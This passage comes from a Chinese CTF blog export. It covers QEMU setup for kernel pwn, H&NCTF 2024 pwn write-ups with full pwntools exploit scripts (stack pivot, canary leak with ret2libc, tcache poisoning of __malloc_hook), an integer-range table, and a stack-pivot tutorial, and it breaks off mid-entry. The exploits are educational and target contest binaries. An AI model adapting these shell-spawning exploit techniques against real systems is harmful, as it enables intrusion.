<p>安装libslirp-dev，这个我还不了解是什么，后续深入了解后再补充，没安装的话有些题目启动会报错，一定要在.&#x2F;configure前安装好，不然就得像我一样编译两次(哭了)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libslirp-dev</span><br></pre></td></tr></table></figure>

<p>没安装的话报错如下</p>
<p>说缺少了user网络后端的支持</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64: -netdev user,id=t0,: network backend &#x27;user&#x27; is not compiled into this binary</span><br></pre></td></tr></table></figure>

<h4 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h4><p>本来是没有后面那个 –enable-slirp 的，加上这个是因为安装了 libslirp-dev</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./configure --enable-slirp</span><br></pre></td></tr></table></figure>

<h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p>此过程大概需要编译30分钟</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure>

<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p>输入 qemu- 后按两次 Tab</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu-[Tab][Tab]</span><br></pre></td></tr></table></figure>

<p>输出如下选择即安装成功</p>
<p><img src="/imgs/$%7Bfiilename%7D/kernel-pwn%E5%85%A5%E9%97%A8%E4%B9%8Bqemu%E7%8E%AF%E5%A2%83%E7%9A%84%E9%85%8D%E7%BD%AE-1.png"></p>
<h3 id="运行sh启动脚本时遇到的错误"><a href="#运行sh启动脚本时遇到的错误" class="headerlink" title="运行sh启动脚本时遇到的错误"></a>运行sh启动脚本时遇到的错误</h3><h4 id="报错1"><a href="#报错1" class="headerlink" title="报错1"></a>报错1</h4><p>缺少了libaio.so.1文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./qemu-system-x86_64: error while loading shared libraries: libaio.so.1: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure>

<p>解决方案</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libaio1</span><br></pre></td></tr></table></figure>

<h4 id="报错2"><a href="#报错2" class="headerlink" title="报错2"></a>报错2</h4><p>缺少了libcurl3，我本机的是libcurl4，很多程序都依赖于libcurl4，而且你只能从libcurl3或libcurl4中选择一个进行安装(有种强制爱的感觉)，如果换成了libcurl3，虚拟机大概率是会崩的，不过还是有解决办法的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./qemu-system-x86_64: /lib/x86_64-linux-gnu/libcurl.so.4: version `CURL_OPENSSL_3&#x27; not found (required by ./qemu-system-x86_64)</span><br></pre></td></tr></table></figure>

<p>解决方案</p>
<p>你可以在这里找到如何同时安装libcurl3和libcurl4的方法：</p>
<p><a href="https://askubuntu.com/questions/1061431/how-to-have-both-libcurl3-and-libcurl4-installed-at-same-time">software installation - How to have both libcurl3 and libcurl4 installed at same time? - Ask Ubuntu</a></p>
<p>我这里简述一下</p>
<p>先查看一下版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-cache policy libcurl4</span><br></pre></td></tr></table></figure>

<p>输出如下</p>
<p><img src="/../imgs/$%7Bfiilename%7D/kernel-pwn%E5%85%A5%E9%97%A8%E4%B9%8Bqemu%E7%8E%AF%E5%A2%83%E7%9A%84%E9%85%8D%E7%BD%AE-2.png"></p>
<p>因为我已经安装好了libcurl3和libcurl4的包，所以我Installed那里显示的就不是什么7.81.0之类的</p>
<p>在输出中可以看到有一个名为 7.68.0-1ubuntu2.5ppa1 的包，我们只需安装这个包，就可以同时拥有libcurl3和libcurl4的环境</p>
<p>直接执行下面的命令，不需要去删除libcurl4</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install libcurl4=7.68.0-1ubuntu2.5ppa1</span><br></pre></td></tr></table></figure>

<h4 id="报错3"><a href="#报错3" class="headerlink" title="报错3"></a>报错3</h4><p>说无法访问kernel模块，该文件不存在</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Could not access KVM kernel module: No such file or directory</span><br><span class="line">failed to initialize KVM: No such file or directory</span><br></pre></td></tr></table></figure>

<p>解决方案</p>
<p>在虚拟机设置中打开 “虚拟化 Inter VT-x&#x2F;EPT 或 AMD-V&#x2F;RVI(V)” 即可</p>
<p><img src="/../imgs/$%7Bfiilename%7D/kernel-pwn%E5%85%A5%E9%97%A8%E4%B9%8Bqemu%E7%8E%AF%E5%A2%83%E7%9A%84%E9%85%8D%E7%BD%AE-3.png"></p>
<h3 id="启动设备测试"><a href="#启动设备测试" class="headerlink" title="启动设备测试"></a>启动设备测试</h3><p>我这里用的是 [HITB GSEC2017]BABYQEMU 这道题</p>
<p>bash中运行启动脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./launch.sh</span><br></pre></td></tr></table></figure>

<p>得到如下结果，说明设备已经启动成功，可以开始pwn啦</p>
<p><img src="/../imgs/$%7Bfiilename%7D/kernel-pwn%E5%85%A5%E9%97%A8%E4%B9%8Bqemu%E7%8E%AF%E5%A2%83%E7%9A%84%E9%85%8D%E7%BD%AE-4.png"></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>qemu</tag>
      </tags>
  </entry>
  <entry>
    <title>H&amp;NCTF 2024 pwn 部分题解</title>
    <url>/2024/05/13/H-NCTF-2024-pwn-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>几十个解的题还是能写出来的，但是几个解和0解的题做不出来，我还是太菜了</p>
<span id="more"></span>

<h3 id="close"><a href="#close" class="headerlink" title="close"></a>close</h3><p>重定向就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec 1&gt;&amp;2</span><br></pre></td></tr></table></figure>

<h3 id="ez-pwn"><a href="#ez-pwn" class="headerlink" title="ez_pwn"></a>ez_pwn</h3><p>考一个栈迁移，第一个printf泄露栈地址，然后利用程序自带的2个leave ret完成栈迁移</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">local_file = <span class="string">&#x27;../ctf_file/pwn&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/home/feichai/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc.so.6&quot;</span>, checksec = <span class="literal">False</span>)</span><br><span class="line">elf=ELF(local_file)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(local_file)</span></span><br><span class="line">io = remote(<span class="string">&#x27;hnctf.imxbt.cn&#x27;</span>, <span class="number">46959</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b *0x08048616</span></span><br><span class="line"><span class="string">    b *0x08048631</span></span><br><span class="line"><span class="string">    b *0x08048666</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    gdb.attach(io,gdbscript)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x0804857D</span></span><br><span class="line">backdoor = <span class="number">0x08048566</span></span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;your name?&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2c</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2c</span>)</span><br><span class="line">stack_addr = u32(r(<span class="number">4</span>))</span><br><span class="line">lg(<span class="string">&quot;stack_addr&quot;</span>,stack_addr)</span><br><span class="line">input_addr = stack_addr- <span class="number">0x38</span></span><br><span class="line">lg(<span class="string">&quot;input_addr&quot;</span>,input_addr)</span><br><span class="line">s(p32(system)+p32(input_addr+<span class="number">20</span>)*<span class="number">2</span>+<span class="string">b&#x27;sh\x00\x00&#x27;</span>*<span class="number">8</span>+p32(input_addr-<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="idea"><a href="#idea" class="headerlink" title="idea"></a>idea</h3><p>输入-1转化为unsigned int变成大数造成栈溢出，fmt泄露canary，然后就是经典的ret2libc了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">local_file = <span class="string">&#x27;../ctf_file/idea&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/home/feichai/ctf_libc/puts_150/libc6-i386_2.23-0ubuntu11.3_amd64.so&quot;</span>, checksec = <span class="literal">False</span>)</span><br><span class="line">elf=ELF(local_file)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    io = process(local_file)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;hnctf.imxbt.cn&#x27;</span>, <span class="number">48805</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b *0x080486CF</span></span><br><span class="line"><span class="string">    b *0x080486E9</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    gdb.attach(io,gdbscript)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt.puts</span><br><span class="line">puts_got = elf.got.puts</span><br><span class="line">vuln = elf.sym.vuln</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">sla(<span class="string">b&#x27;me to read?&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;u a gift!&#x27;</span>,<span class="string">b&#x27;%7$p&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line"><span class="comment">#leak_addr = int(r(8),16)</span></span><br><span class="line"><span class="comment">#libc_addr = leak_addr - libc.sym[b&#x27;__libc_start_main&#x27;] - 247</span></span><br><span class="line">canary = <span class="built_in">int</span>(r(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line">pd = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p32(canary)+p32(<span class="number">0</span>)*<span class="number">3</span>+p32(puts_plt)+p32(vuln)+p32(puts_got)</span><br><span class="line">sla(<span class="string">b&#x27;bytes of data!\n&#x27;</span>,pd)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(ru(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">lg(<span class="string">&#x27;puts_addr&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">libc_system = libc_base + libc.symbols[<span class="string">b&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;me to read?&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;u a gift!&#x27;</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pd = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p32(canary)+p32(<span class="number">0</span>)*<span class="number">3</span>+p32(libc_system) + p32(<span class="number">0</span>) +p32(bin_sh_addr)</span><br><span class="line">sla(<span class="string">b&#x27;bytes of data!\n&#x27;</span>,pd)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="what"><a href="#what" class="headerlink" title="what"></a>what</h3><p>tcache 投毒 + uaf漏洞 + 劫持__malloc_hook，修改__malloc_hook为gadget即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;../ctf_file/what&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/home/feichai/ctf_file/libc-2.27.so&quot;</span>, checksec = <span class="literal">False</span>)</span><br><span class="line">elf=ELF(local_file)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    io = process(local_file)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;hnctf.imxbt.cn&#x27;</span>, <span class="number">50228</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    gdb.attach(io,gdbscript)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Enter your command:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;please enter idx:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&#x27;please enter idx:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sa(<span class="string">&#x27;your content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free()</span><br><span class="line"></span><br><span class="line">free() <span class="comment">#1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">libc_leak = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&#x27;libc_leak&#x27;</span>,libc_leak)</span><br><span class="line"></span><br><span class="line">libc_base = libc_leak - <span class="number">0x3ebca0</span> <span class="comment">#0x3ebca0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">one_gadget = [<span class="number">0x4f29e</span>,<span class="number">0x4f2a5</span>,<span class="number">0x4f302</span>,<span class="number">0x10a2fc</span>]</span><br><span class="line">gadget = libc_base + <span class="number">0x10a2fc</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(malloc_hook))</span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(gadget)*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>write up</category>
      </categories>
  </entry>
  <entry>
    <title>整数类型取值范围</title>
    <url>/2024/04/26/%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E5%8F%96%E5%80%BC%E8%8C%83%E5%9B%B4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>用于整数溢出</p>
<span id="more"></span>

<table>
<thead>
<tr>
<th>type</th>
<th>min</th>
<th>max</th>
<th>hex</th>
</tr>
</thead>
<tbody><tr>
<td>int</td>
<td>-2147483648</td>
<td>2147483647 (2^31 - 1)</td>
<td>0x7FFFFFFF</td>
</tr>
<tr>
<td>unsigned int</td>
<td>0</td>
<td>4294967295 (2^32 - 1)</td>
<td>0xFFFFFFFF</td>
</tr>
<tr>
<td>long</td>
<td>-2147483648</td>
<td>2147483647 (2^31 - 1)</td>
<td>0x7FFFFFFF</td>
</tr>
<tr>
<td>unsigned long</td>
<td>0</td>
<td>4294967295 (2^32 - 1)</td>
<td>0xFFFFFFFF</td>
</tr>
<tr>
<td>long long</td>
<td>-9223372036854775808</td>
<td>9223372036854775807 (2^63 - 1)</td>
<td>0x7FFFFFFFFFFFFFFF</td>
</tr>
<tr>
<td>unsigned long long</td>
<td>0</td>
<td>18446744073709551615 (2^64 - 1)</td>
<td>0xFFFFFFFFFFFFFFFF</td>
</tr>
<tr>
<td>__int8</td>
<td>-128</td>
<td>127</td>
<td>0x7F</td>
</tr>
<tr>
<td>unsigned __int8</td>
<td>0</td>
<td>255</td>
<td>0xFF</td>
</tr>
<tr>
<td>__int16</td>
<td>-32768</td>
<td>32767</td>
<td>0x7FFF</td>
</tr>
<tr>
<td>unsigned __int16</td>
<td>0</td>
<td>65535</td>
<td>0xFFFF</td>
</tr>
<tr>
<td>__int32</td>
<td>-2147483648</td>
<td>2147483647</td>
<td>0x7FFFFFFF</td>
</tr>
<tr>
<td>unsigned __int32</td>
<td>0</td>
<td>4294967295</td>
<td>0xFFFFFFFF</td>
</tr>
<tr>
<td>__int64</td>
<td>-9223372036854775808</td>
<td>9223372036854775807 (2^63 - 1)</td>
<td>0x7FFFFFFFFFFFFFFF</td>
</tr>
<tr>
<td>unsigned __int64</td>
<td>0</td>
<td>18446744073709551615 (2^64 - 1)</td>
<td>0xFFFFFFFFFFFFFFFF</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>栈迁移</title>
    <url>/2024/03/27/%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>躺着躺着突然悟到了栈迁移的真谛，这种感觉谁懂？！</p>
<span id="more"></span>

<h4 id="leave-ret"><a href="#leave-ret" class="headerlink" title="leave ret"></a>leave ret</h4><p>这点非常非常非常重要，能不能理解栈迁移，靠的就是这个。</p>
<p>这里用x86_64位的寄存器当例子 (这里要注意，pop指令是将rsp的内容弹出并赋给相应寄存器，且 rsp + 8)</p>
<p>leave  相当于  mov rsp rbp;pop rbp </p>
<p>ret      相当于  pop rip</p>
<p>每个函数返回时都会执行该操作，如</p>
<p><img src="/imgs/$%7Bfiilename%7D/%E6%A0%88%E8%BF%81%E7%A7%BB-1.png"></p>
<p>其实这个操作就相当于恢复调用该函数的函数的栈空间</p>
<p>下面利用2个例子来理解其如何使用</p>
<h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><h5 id="HDCTF-2023-KEEP-ON"><a href="#HDCTF-2023-KEEP-ON" class="headerlink" title="[HDCTF 2023]KEEP ON"></a>[HDCTF 2023]KEEP ON</h5><p>该题利用fmt漏洞泄露rbp的内容，也就是栈地址，再利用栈迁移来实现漏洞利用</p>
<p><img src="/imgs/$%7Bfiilename%7D/%E6%A0%88%E8%BF%81%E7%A7%BB-2.png"></p>
<p>首先rbp的偏移是16，发送%16$p即可，fmt漏洞这里就不过多解释</p>
<p>我们来看rbp里存的是什么</p>
<p>rbp里存的是main函数的栈底地址0x7ffda23e22a0</p>
<p>0x7ffda23e22a0 - 0x60 就是我们read函数读入的地址，也就是s的地址，我们在这里构造gadget</p>
<p><img src="/imgs/$%7Bfiilename%7D/%E6%A0%88%E8%BF%81%E7%A7%BB-3.png"></p>
<p>接下来第二个read我们构造了下面的pd</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gadget = old_rbp - <span class="number">0x60</span></span><br><span class="line">pd = p64(pop_rdi) + p64(gadget + <span class="number">0x18</span>) + p64(system) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">pd = pd.ljust(<span class="number">0x50</span>,<span class="string">b&#x27;a&#x27;</span>) + p64(gadget - <span class="number">0x8</span>) + p64((leave_ret))</span><br></pre></td></tr></table></figure>

<p>我们先理解后半段pd，在read后函数返回</p>
<p>第一次leave ret</p>
<p>mov rsp rbp;pop rbp 把 rsp 迁移到 rbp 的地址，然后把 rbp 的内容赋给 rbp，这里 rbp 的内容被我们覆盖成了 gadget - 0x8 所以此时 rbp 就迁到了 0x7ffda23e2238</p>
<p>pop rip  把 leave_ret 赋给 rip 进行第二次 leave ret</p>
<p>第二次 leave ret </p>
<p>mov rsp rbp;pop rbp 同上，此时rsp 迁到了 0x7ffda23e2238 ，这时候 rbp 会迁到0x4007ed (此时的rbp不需要管他) ，因为已经用不到了</p>
<p>pop rip 把 pop_rdi 的地址赋值给rip ，成功的劫持了 rip 到我们的 gadget 上，执行我们的rop</p>
<p>前面说过pop时rsp会+8，这也是为什么我们要把 rbp 的内容覆盖成 gadget - 0x8 的原因</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/hdctf&quot;</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;./hdctf&#x27;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/home/feichai/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc.so.6&quot;</span>, checksec = <span class="literal">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/home/feichai/ctf_file/libc.so.6&quot;</span>, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   p.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   p.recvuntil(a, drop=<span class="literal">True</span>)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   p.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: p.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   p.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: p.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    leave_ret = <span class="number">0x4007F2</span></span><br><span class="line">    pop_rdi = <span class="number">0x4008D3</span></span><br><span class="line">    system = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    sa(<span class="string">&#x27;please show me your name: \n&#x27;</span>,<span class="string">b&#x27;%16$p&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;hello,&#x27;</span>)</span><br><span class="line">    old_rbp  = <span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    lg(<span class="string">&#x27;old_rbp&#x27;</span>,old_rbp)</span><br><span class="line"></span><br><span class="line">    gadget = old_rbp - <span class="number">0x60</span></span><br><span class="line">    pd = p64(pop_rdi) + p64(gadget + <span class="number">0x18</span>) + p64(system) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    pd = pd.ljust(<span class="number">0x50</span>,<span class="string">b&#x27;a&#x27;</span>) + p64(gadget - <span class="number">0x8</span>) + p64((leave_ret))</span><br><span class="line">    sa(<span class="string">b&#x27;keep on !&#x27;</span>,pd)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    </span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<h5 id="just-read"><a href="#just-read" class="headerlink" title="just_read"></a>just_read</h5><p>这题是2023重庆市大学生信息安全竞赛的题目，只溢出了0x10给你修改rbp和返回地址</p>
<p><img src="/imgs/$%7Bfiilename%7D/%E6%A0%88%E8%BF%81%E7%A7%BB-4.png"></p>
<p>第一次构造的pd</p>
